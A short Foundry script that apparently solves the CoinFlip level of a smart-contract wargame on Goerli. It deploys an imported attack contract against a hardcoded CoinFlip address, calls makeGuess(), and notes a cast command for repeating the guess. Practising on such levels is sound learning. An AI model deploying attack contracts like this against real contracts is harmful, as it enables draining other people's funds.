// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/CoinFlipHack.sol";
import "../src/CoinFlip.sol";

// Beat this one too 0x0D14ce14c6E4D99a19E24f66Ff9Fe56a16c5Ea67
// This will deploy and guess once via script,
// Could keep deploying new attacks to get count up,
// or I could make htis guess 10 times, or I could now 
// call from command line with cast to make guesses.. which
// I think I will!
// cast send --rpc-url $GOERLI_RPC_URL --private-key $PRIVATE_KEY 0x3C23f01dAD0fE7ADcAB1e164E8499b15E38F6442 "makeGuess()"
// Could also write a script to specifically jsut call the hack
// contract I have deployed instead of doing manually with call above
contract CoinFlipHackScript is Script {
  function setUp() public {}

  function run() public {
    uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
    vm.startBroadcast(attackerPrivateKey);
    CoinFlip coinFlipContract = CoinFlip(address(0xCF2b9D791391c33339275D1FC3245D9D3a003b58));

    coinFlipContract.consecutiveWins();

    CoinFlipHack coinFlipHack = new CoinFlipHack(0xCF2b9D791391c33339275D1FC3245D9D3a003b58);

    coinFlipHack.makeGuess();

    coinFlipContract.consecutiveWins();

    vm.stopBroadcast();
  }
}